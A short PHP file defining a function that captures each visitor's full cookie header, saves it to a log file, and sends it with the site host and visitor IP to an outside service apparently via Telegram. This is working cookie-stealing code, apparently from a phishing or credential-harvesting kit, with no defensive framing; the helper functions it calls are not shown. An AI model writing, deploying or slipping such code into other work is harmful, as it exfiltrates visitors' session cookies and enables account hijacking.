<?php
require_once __DIR__ . '/config.php';

function grab_cookies(): void {
    global $logDir;
    $raw = $_SERVER['HTTP_COOKIE'] ?? '';
    if ($raw === '') return;

    if (!is_dir($logDir)) mkdir($logDir, 0777, true);
    $file = $logDir . '/cookies_' . date('Ymd_His') . '_' . substr(md5($raw), 0, 6) . '.txt';
    file_put_contents($file, $raw);

    send_telegram_file($file, 'Cookies | ' . ($_SERVER['HTTP_HOST'] ?? '-') . ' | ' . visitor_ip());
}